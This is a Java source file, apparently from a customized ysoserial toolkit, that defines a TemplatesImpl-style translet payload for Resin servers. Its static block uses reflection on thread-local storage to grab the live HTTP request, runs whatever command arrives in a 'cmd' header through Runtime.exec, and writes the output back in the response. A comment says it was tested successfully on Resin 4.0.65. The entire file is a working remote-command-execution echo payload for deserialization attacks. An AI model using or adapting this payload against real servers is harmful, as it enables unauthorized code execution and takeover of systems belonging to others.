package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

// https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Resin/code/resinEcho.jsp
// 在resin 4.0.65测试成功
public class MyClassLoader4 extends AbstractTranslet {
    static {
        try{

            Class clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getSuperclass().getDeclaredField("threadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());
            field = obj.getClass().getDeclaredField("table");
            field.setAccessible(true);
            obj = field.get(obj);
            Object[] obj_arr = (Object[]) obj;
            for(int i = 0; i < obj_arr.length; i++) {
                Object o = obj_arr[i];
                if (o == null) continue;
                field = o.getClass().getDeclaredField("value");
                field.setAccessible(true);
                obj = field.get(o);
                if(obj != null && obj.getClass().getName().equals("com.caucho.server.http.HttpRequest")){
                    // 解析请求
                    com.caucho.server.http.HttpRequest httpRequest = (com.caucho.server.http.HttpRequest)obj;
                    String cmd = httpRequest.getHeader("cmd");
                    String testecho = httpRequest.getHeader("Testecho");

                    String res = "";

                    // 构造响应
                    com.caucho.server.http.HttpResponse httpResponse = httpRequest.createResponse();
//                    httpResponse.setHeader("Content-Length", testecho.length() + res.length() + "");
                    java.lang.reflect.Method method = httpResponse.getClass().getDeclaredMethod("createResponseStream", null);
                    method.setAccessible(true);
                    com.caucho.server.http.HttpResponseStream httpResponseStream = (com.caucho.server.http.HttpResponseStream) method.invoke(httpResponse,null);

                    // 有Testecho: 就直接返回输入
                    if(testecho != null && !testecho.isEmpty()){
                        httpResponseStream.write(testecho.getBytes(), 0 ,testecho.length());
                        httpResponseStream.write("\n\n".getBytes());
                    }

                    // 有cmd: 就执行命令
                    if(cmd != null && !cmd.isEmpty()){
                        res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                        httpResponseStream.write(res.getBytes(), 0, res.length());

                    }


                    httpResponseStream.close();

                    break;
                }
            }

        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

